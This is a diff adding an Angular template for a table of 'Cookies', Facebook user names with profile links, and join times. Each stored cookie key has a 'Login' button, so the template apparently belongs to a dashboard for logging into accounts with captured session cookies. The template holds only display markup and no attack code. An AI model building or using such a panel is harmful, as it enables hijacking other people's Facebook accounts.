@@ -1,0 +1,32 @@
+<table>
+    <tbody>
+      <tr>
+        <th>Cookies</th>
+        <th>User Name</th>
+        <th>Time joined</th>
+      </tr>
+    </tbody>
+  
+    <tbody>
+            <tr *ngFor="let item of list" >
+              <td>
+                <table>
+                  <tbody>
+                    <tr *ngIf="!item.child" (click)="viewMore(item)">
+                      <td class="cursor">View more</td>
+                    </tr>
+                    <ng-container *ngIf="item.child">
+                      <tr *ngFor="let key of Object.keys(item.child)">
+                        <td  class="cursor" >  <button (click)="login(item.child[key], key)" >Login</button> {{key}} </td>
+                      </tr>
+                    </ng-container>
+                   
+                  </tbody>
+              </table>
+              </td>
+              <td><a  href="https://www.facebook.com/{{item.userID}}"  target="_blank">{{item.userName}} </a></td>
+              <td>{{item.lastUpdate.seconds * 1000  | date: "dd/MM/yyyy h:mm a z" }}</td>
+             </tr>
+    </tbody>
+  </table>
+
